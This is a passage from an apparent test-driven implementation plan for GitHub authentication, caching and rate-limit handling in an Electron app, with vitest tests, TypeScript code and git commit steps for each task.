    } catch (err) {
      if ((err as NodeJS.ErrnoException).code === 'ENOENT') return null
      console.warn('[github-config] read failed:', redactTokens(String(err)))
      return null
    }
  }

  async write(config: GitHubConfig): Promise<void> {
    const tmp = this.filePath + '.tmp'
    await fs.writeFile(tmp, JSON.stringify(config, null, 2), 'utf8')
    await fs.rename(tmp, this.filePath)
  }
}
```

- [ ] **Step 4: Run + commit**

```bash
npx vitest run tests/unit/github/github-config-store.test.ts
git add src/main/github/github-config-store.ts tests/unit/github/github-config-store.test.ts
git commit -m "feat(github): GitHubConfigStore with atomic write + schema guard"
```

---

### Task B3: AuthProfileStore + tests

**Files:** CREATE `src/main/github/auth/auth-profile-store.ts`, test.

- [ ] **Step 1: Test**

```ts
// tests/unit/github/auth-profile-store.test.ts
import { describe, it, expect, beforeEach, vi } from 'vitest'
import { AuthProfileStore } from '../../../src/main/github/auth/auth-profile-store'

vi.mock('electron', () => ({
  safeStorage: {
    isEncryptionAvailable: () => true,
    encryptString: (s: string) => Buffer.from('enc:' + s),
    decryptString: (b: Buffer) => b.toString().replace(/^enc:/, ''),
  },
}))

describe('AuthProfileStore', () => {
  let mem: any = { config: null }
  let store: AuthProfileStore

  beforeEach(() => {
    mem = { config: null }
    store = new AuthProfileStore({
      readConfig: async () => mem.config,
      writeConfig: async (c) => { mem.config = c },
    })
  })

  it('adds PAT profile with encrypted token', async () => {
    const id = await store.addProfile({
      kind: 'pat-fine-grained',
      label: 'n',
      username: 'n',
      scopes: ['pull_requests'],
      capabilities: ['pulls'],
      rawToken: 'github_pat_ABC',
      expiryObservable: true,
    })
    const p = mem.config.authProfiles[id]
    expect(p.tokenCiphertext).toBeTruthy()
    expect(p.tokenCiphertext).not.toBe('github_pat_ABC')
  })

  it('decrypts on getToken', async () => {
    const id = await store.addProfile({
      kind: 'pat-classic', label: 'x', username: 'x',
      scopes: [], capabilities: [], rawToken: 'ghp_X',
      expiryObservable: false,
    })
    expect(await store.getToken(id)).toBe('ghp_X')
  })

  it('gh-cli kind stores no ciphertext', async () => {
    const id = await store.addProfile({
      kind: 'gh-cli', label: 'cli', username: 'foo',
      scopes: [], capabilities: [], ghCliUsername: 'foo',
      expiryObservable: false,
    })
    expect(mem.config.authProfiles[id].tokenCiphertext).toBeUndefined()
    expect(mem.config.authProfiles[id].ghCliUsername).toBe('foo')
  })

  it('removeProfile wipes entry and clears defaultAuthProfileId if it was default', async () => {
    const id = await store.addProfile({
      kind: 'oauth', label: 'x', username: 'x',
      scopes: [], capabilities: [], rawToken: 'gho_x',
      expiryObservable: false,
    })
    mem.config.defaultAuthProfileId = id
    await store.removeProfile(id)
    expect(mem.config.authProfiles[id]).toBeUndefined()
    expect(mem.config.defaultAuthProfileId).toBeUndefined()
  })

  it('updateProfile throws on unknown id', async () => {
    await expect(store.updateProfile('nope', { label: 'x' })).rejects.toThrow(/not found/)
  })

  it('listProfiles returns array', async () => {
    await store.addProfile({
      kind: 'oauth', label: 'x', username: 'x',
      scopes: [], capabilities: [], rawToken: 'gho_',
      expiryObservable: false,
    })
    expect((await store.listProfiles()).length).toBe(1)
  })
})
```

- [ ] **Step 2: Run — expect fail**

```bash
npx vitest run tests/unit/github/auth-profile-store.test.ts
```

- [ ] **Step 3: Implement**

```ts
// src/main/github/auth/auth-profile-store.ts
import { safeStorage } from 'electron'
import { randomUUID } from 'node:crypto'
import type { AuthProfile, GitHubConfig } from '../../../shared/github-types'
import {
  GITHUB_CONFIG_SCHEMA_VERSION,
  DEFAULT_SYNC_INTERVALS,
  DEFAULT_FEATURE_TOGGLES,
} from '../../../shared/github-constants'

export interface AuthProfileStoreIO {
  readConfig(): Promise<GitHubConfig | null>
  writeConfig(config: GitHubConfig): Promise<void>
}

export interface AddProfileInput {
  kind: AuthProfile['kind']
  label: string
  username: string
  avatarUrl?: string
  scopes: string[]
  capabilities: AuthProfile['capabilities']
  allowedRepos?: string[]
  rawToken?: string
  ghCliUsername?: string
  expiresAt?: number
  expiryObservable: boolean
}

function emptyConfig(): GitHubConfig {
  return {
    schemaVersion: GITHUB_CONFIG_SCHEMA_VERSION,
    authProfiles: {},
    featureToggles: { ...DEFAULT_FEATURE_TOGGLES },
    syncIntervals: { ...DEFAULT_SYNC_INTERVALS },
    enabledByDefault: false,
    transcriptScanningOptIn: false,
  }
}

export class AuthProfileStore {
  constructor(private io: AuthProfileStoreIO) {}

  private async load(): Promise<GitHubConfig> {
    return (await this.io.readConfig()) ?? emptyConfig()
  }

  async addProfile(input: AddProfileInput): Promise<string> {
    const id = randomUUID()
    const config = await this.load()

    let tokenCiphertext: string | undefined
    if (input.rawToken && input.kind !== 'gh-cli') {
      if (!safeStorage.isEncryptionAvailable()) {
        throw new Error('OS keychain unavailable; cannot encrypt token')
      }
      tokenCiphertext = safeStorage.encryptString(input.rawToken).toString('base64')
    }

    config.authProfiles[id] = {
      id,
      kind: input.kind,
      label: input.label,
      username: input.username,
      avatarUrl: input.avatarUrl,
      scopes: input.scopes,
      capabilities: input.capabilities,
      allowedRepos: input.allowedRepos,
      tokenCiphertext,
      ghCliUsername: input.ghCliUsername,
      createdAt: Date.now(),
      lastVerifiedAt: Date.now(),
      expiresAt: input.expiresAt,
      expiryObservable: input.expiryObservable,
    }
    await this.io.writeConfig(config)
    return id
  }

  async getToken(id: string): Promise<string | null> {
    const config = await this.load()
    const p = config.authProfiles[id]
    if (!p || !p.tokenCiphertext) return null
    const buf = Buffer.from(p.tokenCiphertext, 'base64')
    return safeStorage.decryptString(buf)
  }

  async removeProfile(id: string): Promise<void> {
    const config = await this.load()
    delete config.authProfiles[id]
    if (config.defaultAuthProfileId === id) config.defaultAuthProfileId = undefined
    await this.io.writeConfig(config)
  }

  async updateProfile(id: string, patch: Partial<AuthProfile>): Promise<void> {
    const config = await this.load()
    const existing = config.authProfiles[id]
    if (!existing) throw new Error(`Profile not found: ${id}`)
    config.authProfiles[id] = { ...existing, ...patch, id }
    await this.io.writeConfig(config)
  }

  async listProfiles(): Promise<AuthProfile[]> {
    const config = await this.load()
    return Object.values(config.authProfiles)
  }
}
```

- [ ] **Step 4: Run + commit**

```bash
npx vitest run tests/unit/github/auth-profile-store.test.ts
git add src/main/github/auth/auth-profile-store.ts tests/unit/github/auth-profile-store.test.ts
git commit -m "feat(github): AuthProfileStore with safeStorage + gh-cli kind handling"
```

---

## Phase C — gh CLI Delegation

### Task C1: gh CLI parser + token fetcher

**Files:** CREATE `src/main/github/auth/gh-cli-delegate.ts`, test.

- [ ] **Step 1: Test**

```ts
// tests/unit/github/gh-cli-delegate.test.ts
import { describe, it, expect, vi } from 'vitest'
import {
  parseGhAuthStatus,
  ghAuthToken,
  ghAuthStatus,
} from '../../../src/main/github/auth/gh-cli-delegate'

describe('parseGhAuthStatus', () => {
  it('extracts usernames from multi-account output', () => {
    const out = [
      'github.com',
      '  ✓ Logged in to github.com account nubbymong (keyring)',
      '  - Active account: true',
      '  ✓ Logged in to github.com account personal (keyring)',
    ].join('\n')
    expect(parseGhAuthStatus(out)).toEqual(['nubbymong', 'personal'])
  })
  it('returns [] when not logged in', () => {
    expect(parseGhAuthStatus('You are not logged into any GitHub hosts.')).toEqual([])
  })
  it('ignores non-github.com hosts', () => {
    const out = [
      '  ✓ Logged in to github.com account nubby (keyring)',
      '  ✓ Logged in to ghe.example.com account other (keyring)',
    ].join('\n')
    expect(parseGhAuthStatus(out)).toEqual(['nubby'])
  })
})

describe('ghAuthToken', () => {
  it('runs gh auth token --user X', async () => {
    const run = vi.fn().mockResolvedValue({ stdout: 'gho_xyz\n', stderr: '', code: 0 })
    const tok = await ghAuthToken('nubbymong', run)
    expect(run).toHaveBeenCalledWith(['auth', 'token', '--user', 'nubbymong'])
    expect(tok).toBe('gho_xyz')
  })
  it('throws on non-zero exit', async () => {
    const run = vi.fn().mockResolvedValue({ stdout: '', stderr: 'no such user', code: 1 })
    await expect(ghAuthToken('bad', run)).rejects.toThrow(/no such user|exit/i)
  })
  it('throws on spawn error', async () => {
    const run = vi.fn().mockRejectedValue(new Error('ENOENT'))
    await expect(ghAuthToken('x', run)).rejects.toThrow(/ENOENT/)
  })
})

describe('ghAuthStatus', () => {
  it('tolerates non-zero exit (status writes to stderr)', async () => {
    const run = vi.fn().mockResolvedValue({
      stdout: '',
      stderr: '✓ Logged in to github.com account nubby (keyring)',
      code: 0,
    })
    expect(await ghAuthStatus(run)).toEqual(['nubby'])
  })
  it('returns [] when gh is missing', async () => {
    const run = vi.fn().mockRejectedValue(new Error('spawn gh ENOENT'))
    expect(await ghAuthStatus(run)).toEqual([])
  })
})
```

- [ ] **Step 2: Run — expect fail**

```bash
npx vitest run tests/unit/github/gh-cli-delegate.test.ts
```

- [ ] **Step 3: Implement**

```ts
// src/main/github/auth/gh-cli-delegate.ts
import { spawn } from 'node:child_process'
import { redactTokens } from '../security/token-redactor'

export interface RunResult { stdout: string; stderr: string; code: number }
export type RunGh = (args: string[]) => Promise<RunResult>

export function parseGhAuthStatus(output: string): string[] {
  const users: string[] = []
  for (const m of output.matchAll(/Logged in to github\.com account (\S+)/g)) {
    users.push(m[1])
  }
  return users
}

export async function ghAuthToken(username: string, run: RunGh): Promise<string> {
  const r = await run(['auth', 'token', '--user', username])
  if (r.code !== 0) {
    throw new Error(redactTokens(r.stderr || `gh auth token exited ${r.code}`))
  }
  return r.stdout.trim()
}

export async function ghAuthStatus(run: RunGh): Promise<string[]> {
  try {
    const r = await run(['auth', 'status'])
    return parseGhAuthStatus(r.stdout + '\n' + r.stderr)
  } catch (err) {
    console.warn('[gh-cli] auth status failed:', redactTokens(String(err)))
    return []
  }
}

export function defaultGhRun(): RunGh {
  return (args) =>
    new Promise<RunResult>((resolve, reject) => {
      const proc = spawn('gh', args, { stdio: ['ignore', 'pipe', 'pipe'] })
      let stdout = ''
      let stderr = ''
      proc.stdout.on('data', (c) => (stdout += c.toString()))
      proc.stderr.on('data', (c) => (stderr += c.toString()))
      proc.on('error', reject)
      proc.on('close', (code) => resolve({ stdout, stderr, code: code ?? -1 }))
    })
}
```

- [ ] **Step 4: Run + commit**

```bash
npx vitest run tests/unit/github/gh-cli-delegate.test.ts
git add src/main/github/auth/gh-cli-delegate.ts tests/unit/github/gh-cli-delegate.test.ts
git commit -m "feat(github): gh CLI delegate with mandatory --user"
```

---

## Phase D — OAuth Device Flow

### Task D1: Device flow (DI-friendly for testability)

**Files:** CREATE `src/main/github/auth/oauth-device-flow.ts`, test.

- [ ] **Step 1: Test (no fake timers — uses injected sleep)**

```ts
// tests/unit/github/oauth-device-flow.test.ts
import { describe, it, expect, vi, afterEach } from 'vitest'
import {
  requestDeviceCode,
  pollForAccessToken,
} from '../../../src/main/github/auth/oauth-device-flow'

const origFetch = globalThis.fetch
afterEach(() => { globalThis.fetch = origFetch })

describe('requestDeviceCode', () => {
  it('POSTs and returns parsed body', async () => {
    globalThis.fetch = vi.fn(async (url: any, opts: any) => {
      expect(String(url)).toContain('login/device/code')
      expect(opts.method).toBe('POST')
      expect(opts.body).toMatch(/client_id=/)
      return {
        ok: true,
        json: async () => ({
          device_code: 'D', user_code: 'UC', verification_uri: 'vu',
          expires_in: 900, interval: 5,
        }),
      } as any
    })
    const r = await requestDeviceCode('public_repo')
    expect(r.user_code).toBe('UC')
  })
  it('throws on HTTP error', async () => {
    globalThis.fetch = vi.fn(async () => ({ ok: false, status: 500 }) as any)
    await expect(requestDeviceCode('x')).rejects.toThrow(/500/)
  })
})

describe('pollForAccessToken', () => {
  const fakeSleep = () => Promise.resolve()

  it('returns token when ready', async () => {
    globalThis.fetch = vi.fn()
      .mockResolvedValueOnce({ ok: true, json: async () => ({ error: 'authorization_pending' }) } as any)
      .mockResolvedValueOnce({ ok: true, json: async () => ({ access_token: 'gho_ok' }) } as any)
    const r = await pollForAccessToken('D', 5, fakeSleep)
    expect(r.access_token).toBe('gho_ok')
  })

  it('throws on access_denied', async () => {
    globalThis.fetch = vi.fn(async () =>
      ({ ok: true, json: async () => ({ error: 'access_denied' }) }) as any,
    )
    await expect(pollForAccessToken('D', 5, fakeSleep)).rejects.toThrow(/access_denied/)
  })

  it('respects slow_down interval bump', async () => {
    const sleeps: number[] = []
    const sleep = (ms: number) => { sleeps.push(ms); return Promise.resolve() }
    globalThis.fetch = vi.fn()
      .mockResolvedValueOnce({ ok: true, json: async () => ({ error: 'slow_down', interval: 10 }) } as any)
      .mockResolvedValueOnce({ ok: true, json: async () => ({ access_token: 'gho_' }) } as any)
    await pollForAccessToken('D', 5, sleep)
    expect(sleeps[0]).toBe(5_000)
    expect(sleeps[1]).toBe(10_000)
  })

  it('cancellable: onCancel signal returns undefined', async () => {
    const controller = { cancelled: false }
    globalThis.fetch = vi.fn(async () => {
      controller.cancelled = true
      return { ok: true, json: async () => ({ error: 'authorization_pending' }) } as any
    })
    const r = await pollForAccessToken('D', 5, fakeSleep, () => controller.cancelled)
    expect(r.access_token).toBeUndefined()
    expect(r.error).toBe('cancelled')
  })
})
```

- [ ] **Step 2: Run — expect fail**

```bash
npx vitest run tests/unit/github/oauth-device-flow.test.ts
```

- [ ] **Step 3: Implement**

```ts
// src/main/github/auth/oauth-device-flow.ts
import {
  GITHUB_DEVICE_CODE_URL,
  GITHUB_OAUTH_CLIENT_ID,
  GITHUB_OAUTH_TOKEN_URL,
} from '../../../shared/github-constants'
import type { DeviceCodeResponse, OAuthTokenResponse } from '../../../shared/github-types'

export async function requestDeviceCode(scope: string): Promise<DeviceCodeResponse> {
  const body = new URLSearchParams({ client_id: GITHUB_OAUTH_CLIENT_ID, scope })
  const r = await fetch(GITHUB_DEVICE_CODE_URL, {
    method: 'POST',
    headers: {
      Accept: 'application/json',
      'Content-Type': 'application/x-www-form-urlencoded',
    },
    body: body.toString(),
  })
  if (!r.ok) throw new Error(`device_code HTTP ${r.status}`)
  return (await r.json()) as DeviceCodeResponse
}

export type Sleep = (ms: number) => Promise<void>
export type IsCancelled = () => boolean

export async function pollForAccessToken(
  deviceCode: string,
  intervalSec: number,
  sleep: Sleep = (ms) => new Promise((r) => setTimeout(r, ms)),
  isCancelled: IsCancelled = () => false,
): Promise<OAuthTokenResponse> {
  let currentInterval = Math.max(intervalSec, 1)
  while (true) {
    await sleep(currentInterval * 1000)
    if (isCancelled()) return { error: 'cancelled' }

    const body = new URLSearchParams({
      client_id: GITHUB_OAUTH_CLIENT_ID,
      device_code: deviceCode,
      grant_type: 'urn:ietf:params:oauth:grant-type:device_code',
    })
    const r = await fetch(GITHUB_OAUTH_TOKEN_URL, {
      method: 'POST',
      headers: {
        Accept: 'application/json',
        'Content-Type': 'application/x-www-form-urlencoded',
      },
      body: body.toString(),
    })
    const json = (await r.json()) as OAuthTokenResponse
    if (json.access_token) return json
    if (json.error === 'authorization_pending') continue
    if (json.error === 'slow_down') {
      currentInterval = json.interval ?? currentInterval + 5
      continue
    }
    if (json.error) throw new Error(`OAuth error: ${json.error}`)
  }
}
```

- [ ] **Step 4: Run + commit**

```bash
npx vitest run tests/unit/github/oauth-device-flow.test.ts
git add src/main/github/auth/oauth-device-flow.ts tests/unit/github/oauth-device-flow.test.ts
git commit -m "feat(github): OAuth device flow with DI sleep + cancellable polling"
```

---

## Phase E — PAT Verification

### Task E1: PAT verifier + probe

**Files:** CREATE `src/main/github/auth/pat-verifier.ts`, test.

- [ ] **Step 1: Test**

```ts
// tests/unit/github/pat-verifier.test.ts
import { describe, it, expect, vi, afterEach } from 'vitest'
import { verifyToken, probeRepoAccess, parseExpiryHeader } from '../../../src/main/github/auth/pat-verifier'

const orig = globalThis.fetch
afterEach(() => { globalThis.fetch = orig })

describe('parseExpiryHeader', () => {
  it('parses GitHub format', () => {
    const t = parseExpiryHeader('2026-07-01 12:00:00 UTC')
    expect(new Date(t!).getUTCFullYear()).toBe(2026)
  })
  it('returns undefined on garbage', () => {
    expect(parseExpiryHeader('???')).toBeUndefined()
  })
})

describe('verifyToken', () => {
  it('returns username + scopes + expiry on 200', async () => {
    globalThis.fetch = vi.fn(async () => ({
      ok: true, status: 200,
      headers: { get: (h: string) => (({
        'x-oauth-scopes': 'repo, read:org',
        'github-authentication-token-expiration': '2026-07-01 12:00:00 UTC',
      } as any)[h.toLowerCase()] ?? null) },
      json: async () => ({ login: 'nub', avatar_url: 'https://a' }),
    }) as any)
    const r = await verifyToken('ghp_x')
    expect(r!.username).toBe('nub')
    expect(r!.scopes).toEqual(['repo', 'read:org'])
    expect(r!.expiresAt).toBeGreaterThan(Date.now())
  })
  it('returns null on 401', async () => {
    globalThis.fetch = vi.fn(async () => ({ ok: false, status: 401 }) as any)
    expect(await verifyToken('bad')).toBeNull()
  })
})

describe('probeRepoAccess', () => {
  it('true on 200', async () => {
    globalThis.fetch = vi.fn(async () => ({ ok: true, status: 200 }) as any)
    expect(await probeRepoAccess('ghp_', 'a/b')).toBe(true)
  })
  it('false on 404', async () => {
    globalThis.fetch = vi.fn(async () => ({ ok: false, status: 404 }) as any)
    expect(await probeRepoAccess('ghp_', 'a/b')).toBe(false)
  })
})
```

- [ ] **Step 2: Run — expect fail**

```bash
npx vitest run tests/unit/github/pat-verifier.test.ts
```

- [ ] **Step 3: Implement**

```ts
// src/main/github/auth/pat-verifier.ts
import { GITHUB_API_BASE } from '../../../shared/github-constants'

export interface VerifyResult {
  username: string
  avatarUrl?: string
  scopes: string[]
  expiresAt?: number
}

export async function verifyToken(token: string): Promise<VerifyResult | null> {
  const r = await fetch(`${GITHUB_API_BASE}/user`, {
    headers: {
      Authorization: `token ${token}`,
      Accept: 'application/vnd.github+json',
      'User-Agent': 'ClaudeCommandCenter',
    },
  })
  if (!r.ok) return null
  const u = (await r.json()) as { login: string; avatar_url?: string }
  const scopes = (r.headers.get('x-oauth-scopes') ?? '')
    .split(',').map((s) => s.trim()).filter(Boolean)
  const exp = r.headers.get('github-authentication-token-expiration')
  return {
    username: u.login,
    avatarUrl: u.avatar_url,
    scopes,
    expiresAt: exp ? parseExpiryHeader(exp) : undefined,
  }
}

export async function probeRepoAccess(token: string, slug: string): Promise<boolean> {
  const r = await fetch(`${GITHUB_API_BASE}/repos/${slug}`, {
    headers: {
      Authorization: `token ${token}`,
      Accept: 'application/vnd.github+json',
      'User-Agent': 'ClaudeCommandCenter',
    },
  })
  return r.ok
}

export function parseExpiryHeader(raw: string): number | undefined {
  const iso = raw.replace(' UTC', 'Z').replace(' ', 'T')
  const t = Date.parse(iso)
  return Number.isNaN(t) ? undefined : t
}
```

- [ ] **Step 4: Run + commit**

```bash
npx vitest run tests/unit/github/pat-verifier.test.ts
git add src/main/github/auth/pat-verifier.ts tests/unit/github/pat-verifier.test.ts
git commit -m "feat(github): PAT verifier + /repos probe + expiry parse"
```

---

## Phase F — GitHub Client

### Task F1: EtagCache

**Files:** CREATE `src/main/github/client/etag-cache.ts`, test.

- [ ] **Step 1: Test**

```ts
// tests/unit/github/etag-cache.test.ts
import { describe, it, expect } from 'vitest'
import { EtagCache } from '../../../src/main/github/client/etag-cache'

describe('EtagCache', () => {
  it('set/get', () => {
    const c = new EtagCache({})
    c.set('k', 'v')
    expect(c.get('k')).toBe('v')
  })
  it('undefined for missing', () => {
    expect(new EtagCache({}).get('no')).toBeUndefined()
  })
  it('delete clears', () => {
    const c = new EtagCache({})
    c.set('k', 'v')
    c.delete('k')
    expect(c.get('k')).toBeUndefined()
  })
  it('persists through backing map', () => {
    const store: Record<string, string> = {}
    new EtagCache(store).set('k', 'v')
    expect(store.k).toBe('v')
  })
})
```

- [ ] **Step 2: Implement + run + commit**

```ts
// src/main/github/client/etag-cache.ts
export class EtagCache {
  constructor(private backing: Record<string, string>) {}
  get(key: string): string | undefined { return this.backing[key] }
  set(key: string, etag: string): void { this.backing[key] = etag }
  delete(key: string): void { delete this.backing[key] }
}
```

```bash
npx vitest run tests/unit/github/etag-cache.test.ts
git add src/main/github/client/etag-cache.ts tests/unit/github/etag-cache.test.ts
git commit -m "feat(github): EtagCache over persisted map"
```

---

### Task F2: RateLimitShield

**Files:** CREATE `src/main/github/client/rate-limit-shield.ts`, test.

- [ ] **Step 1: Test**

```ts
// tests/unit/github/rate-limit-shield.test.ts
import { describe, it, expect } from 'vitest'
import { RateLimitShield } from '../../../src/main/github/client/rate-limit-shield'

describe('RateLimitShield', () => {
  it('allows calls with no state', () => {
    expect(new RateLimitShield().canCall('core', Date.now())).toBe(true)
  })
  it('updates + snapshot', () => {
    const s = new RateLimitShield()
    const now = Date.now()
    s.update('core', { limit: 5000, remaining: 4000, resetAt: now + 1000, capturedAt: now })
    expect(s.snapshot('core')?.remaining).toBe(4000)
  })
  it('blocks when <10% remaining before reset', () => {
    const s = new RateLimitShield()
    const now = Date.now()
    s.update('core', { limit: 5000, remaining: 400, resetAt: now + 60_000, capturedAt: now })
    expect(s.canCall('core', now)).toBe(false)
  })
  it('resumes after reset', () => {
    const s = new RateLimitShield()
    const now = Date.now()
    s.update('core', { limit: 5000, remaining: 400, resetAt: now + 60_000, capturedAt: now })
    expect(s.canCall('core', now + 61_000)).toBe(true)
  })
  it('per-bucket independence', () => {
    const s = new RateLimitShield()
    const now = Date.now()
    s.update('core', { limit: 5000, remaining: 100, resetAt: now + 60_000, capturedAt: now })
    expect(s.canCall('graphql', now)).toBe(true)
  })
  it('nextAllowedAt returns resetAt when blocked', () => {
    const s = new RateLimitShield()
    const now = Date.now()
    const reset = now + 60_000
    s.update('core', { limit: 5000, remaining: 0, resetAt: reset, capturedAt: now })
    expect(s.nextAllowedAt('core')).toBe(reset)
  })
})
```

- [ ] **Step 2: Implement + run + commit**

```ts
// src/main/github/client/rate-limit-shield.ts
import type { RateLimitSnapshot } from '../../../shared/github-types'

export type Bucket = 'core' | 'search' | 'graphql'

export class RateLimitShield {
  private buckets: Partial<Record<Bucket, RateLimitSnapshot>> = {}

  update(b: Bucket, s: RateLimitSnapshot): void { this.buckets[b] = s }
  snapshot(b: Bucket): RateLimitSnapshot | undefined { return this.buckets[b] }

  canCall(b: Bucket, now: number): boolean {
    const s = this.buckets[b]
    if (!s) return true
    if (now >= s.resetAt) return true
    return s.remaining >= Math.ceil(s.limit * 0.1)
  }

  nextAllowedAt(b: Bucket): number | null {
    const s = this.buckets[b]
    return s ? s.resetAt : null
  }
}
```

```bash
npx vitest run tests/unit/github/rate-limit-shield.test.ts
git add src/main/github/client/rate-limit-shield.ts tests/unit/github/rate-limit-shield.test.ts
git commit -m "feat(github): per-bucket rate-limit shield"
```

---

### Task F3: CacheStore

**Files:** CREATE `src/main/github/cache/cache-store.ts`, test.

- [ ] **Step 1: Test**

```ts
// tests/unit/github/cache-store.test.ts
import { describe, it, expect, beforeEach } from 'vitest'
import { promises as fs } from 'node:fs'
import path from 'node:path'
import os from 'node:os'
import { CacheStore } from '../../../src/main/github/cache/cache-store'
import { GITHUB_CACHE_SCHEMA_VERSION } from '../../../src/shared/github-constants'

describe('CacheStore', () => {
  let tmp: string
  let store: CacheStore

  beforeEach(async () => {
    tmp = await fs.mkdtemp(path.join(os.tmpdir(), 'ghcache-'))
    store = new CacheStore(tmp)
  })

  it('empty on no file', async () => {
    const c = await store.load()
    expect(c.schemaVersion).toBe(GITHUB_CACHE_SCHEMA_VERSION)
    expect(c.repos).toEqual({})
  })

  it('persists + reloads', async () => {
    const c = await store.load()
    c.repos['a/b'] = { etags: {}, lastSynced: 1, accessedAt: 1 }
    c.lru = ['a/b']
    await store.save(c)
    expect((await store.load()).repos['a/b']).toBeDefined()
  })

  it('LRU evicts over cap', async () => {
    const c = await store.load()
    for (let i = 0; i < 55; i++) {
      const k = `o/r${i}`
      c.repos[k] = { etags: {}, lastSynced: i, accessedAt: i }
      c.lru.push(k)
    }
    await store.save(c)
    const re = await store.load()
    expect(Object.keys(re.repos).length).toBeLessThanOrEqual(50)
    expect(re.repos['o/r0']).toBeUndefined()
    expect(re.repos['o/r54']).toBeDefined()
  })

  it('corrupt file → backup + empty', async () => {
    await fs.writeFile(path.join(tmp, 'github-cache.json'), '{bad', 'utf8')
    const c = await store.load()
    expect(c.repos).toEqual({})
    const entries = await fs.readdir(tmp)
    expect(entries.some((e) => e.startsWith('github-cache.corrupt-'))).toBe(true)
  })

  it('retains at most 3 corrupt backups', async () => {
    for (let i = 0; i < 5; i++) {
      await fs.writeFile(path.join(tmp, `github-cache.corrupt-${1000 + i}.json`), 'x', 'utf8')
    }
    await fs.writeFile(path.join(tmp, 'github-cache.json'), '{bad', 'utf8')
    await store.load()
    const entries = await fs.readdir(tmp)
    const corrupts = entries.filter((e) => e.startsWith('github-cache.corrupt-'))
    expect(corrupts.length).toBe(3)
  })

  it('unknown schemaVersion → backup + empty', async () => {
    await fs.writeFile(
      path.join(tmp, 'github-cache.json'),
      JSON.stringify({ schemaVersion: 999 }),
      'utf8',
    )
    const c = await store.load()
    expect(c.repos).toEqual({})
    const entries = await fs.readdir(tmp)
    expect(entries.some((e) => e.startsWith('github-cache.corrupt-'))).toBe(true)
  })
})
```

- [ ] **Step 2: Run — expect fail**

```bash
npx vitest run tests/unit/github/cache-store.test.ts
```

- [ ] **Step 3: Implement**

```ts
// src/main/github/cache/cache-store.ts
import { promises as fs } from 'node:fs'
import path from 'node:path'
import type { GitHubCache } from '../../../shared/github-types'
import {
  CACHE_CORRUPT_BACKUPS_KEEP,
  CACHE_MAX_REPOS,
  GITHUB_CACHE_SCHEMA_VERSION,
} from '../../../shared/github-constants'
import { redactTokens } from '../security/token-redactor'

const FILENAME = 'github-cache.json'

function empty(): GitHubCache {
  return {
    schemaVersion: GITHUB_CACHE_SCHEMA_VERSION,
    repos: {},
    notificationsByProfile: {},
    lru: [],
  }
}

export class CacheStore {
  constructor(private dir: string) {}
  private get filePath() { return path.join(this.dir, FILENAME) }

  async load(): Promise<GitHubCache> {
    let raw: string
    try {
      raw = await fs.readFile(this.filePath, 'utf8')
    } catch (err) {
      if ((err as NodeJS.ErrnoException).code === 'ENOENT') return empty()
      console.warn('[github-cache] read failed:', redactTokens(String(err)))
      return empty()
    }
    try {
      const parsed = JSON.parse(raw)
      if (parsed.schemaVersion !== GITHUB_CACHE_SCHEMA_VERSION) {
        await this.backupCorrupt()
        return empty()
      }
      return parsed as GitHubCache
    } catch {
      await this.backupCorrupt()
      return empty()
    }
  }

  async save(cache: GitHubCache): Promise<void> {
    const lru = cache.lru.filter((s) => s in cache.repos)
    while (Object.keys(cache.repos).length > CACHE_MAX_REPOS && lru.length > 0) {
      const evict = lru.shift()!
      delete cache.repos[evict]
    }
    cache.lru = lru
    const tmp = this.filePath + '.tmp'
    await fs.writeFile(tmp, JSON.stringify(cache), 'utf8')
    await fs.rename(tmp, this.filePath)
  }

  private async backupCorrupt(): Promise<void> {
    const ts = Date.now()
    const dest = path.join(this.dir, `github-cache.corrupt-${ts}.json`)
    try { await fs.rename(this.filePath, dest) } catch { /* ignore */ }
    await this.pruneCorrupt()
  }

  private async pruneCorrupt(): Promise<void> {
    const entries = await fs.readdir(this.dir)
    const backups = entries
      .filter((e) => e.startsWith('github-cache.corrupt-') && e.endsWith('.json'))
      .sort()
    const excess = backups.length - CACHE_CORRUPT_BACKUPS_KEEP
    for (let i = 0; i < excess; i++) {
      await fs.unlink(path.join(this.dir, backups[i])).catch(() => {})
    }
  }
}
```

- [ ] **Step 4: Run + commit**

```bash
npx vitest run tests/unit/github/cache-store.test.ts
git add src/main/github/cache/cache-store.ts tests/unit/github/cache-store.test.ts
git commit -m "feat(github): CacheStore with LRU + corrupt backup retention"
```

---

### Task F4: githubFetch wrapper

**Files:** CREATE `src/main/github/client/github-fetch.ts`, test.

- [ ] **Step 1: Test**

```ts
// tests/unit/github/github-fetch.test.ts
import { describe, it, expect, vi, afterEach } from 'vitest'
import { githubFetch, RateLimitError } from '../../../src/main/github/client/github-fetch'
import { RateLimitShield } from '../../../src/main/github/client/rate-limit-shield'
import { EtagCache } from '../../../src/main/github/client/etag-cache'

const orig = globalThis.fetch
afterEach(() => { globalThis.fetch = orig })

const makeResp = (body: any, headers: Record<string, string> = {}, status = 200) => ({
  ok: status >= 200 && status < 300,
  status,
  headers: { get: (h: string) => headers[h.toLowerCase()] ?? null },
  json: async () => body,
  text: async () => JSON.stringify(body),
})

describe('githubFetch', () => {
  const shield = new RateLimitShield()
  const etags = new EtagCache({})
  const tokenFn = async () => 'ghp_X'

  it('sends Authorization + captures rate limit headers', async () => {
    globalThis.fetch = vi.fn(async (_u: any, opts: any) => {
      expect(opts.headers.Authorization).toBe('token ghp_X')
      return makeResp({}, {
        'x-ratelimit-limit': '5000',
        'x-ratelimit-remaining': '4999',
        'x-ratelimit-reset': String(Math.floor(Date.now() / 1000) + 3600),
      }) as any
    })
    const s = new RateLimitShield()
    await githubFetch('/user', { tokenFn, shield: s, etags })
    expect(s.snapshot('core')?.remaining).toBe(4999)
  })

  it('sends If-None-Match when cached', async () => {
    const e = new EtagCache({ 'GET /user': '"old"' })
    globalThis.fetch = vi.fn(async (_u: any, opts: any) => {
      expect(opts.headers['If-None-Match']).toBe('"old"')
      return makeResp({}, {}, 304) as any
    })
    const r = await githubFetch('/user', { tokenFn, shield, etags: e })
    expect(r.status).toBe(304)
  })

  it('captures new ETag on 200', async () => {
    const e = new EtagCache({})
    globalThis.fetch = vi.fn(async () => makeResp({}, { etag: '"new"' }) as any)
    await githubFetch('/x', { tokenFn, shield, etags: e })
    expect(e.get('GET /x')).toBe('"new"')
  })

  it('throws RateLimitError when blocked', async () => {
    const s = new RateLimitShield()
    const now = Date.now()
    s.update('core', { limit: 5000, remaining: 0, resetAt: now + 60_000, capturedAt: now })
    globalThis.fetch = vi.fn() as any
    await expect(githubFetch('/x', { tokenFn, shield: s, etags: new EtagCache({}) }))
      .rejects.toBeInstanceOf(RateLimitError)
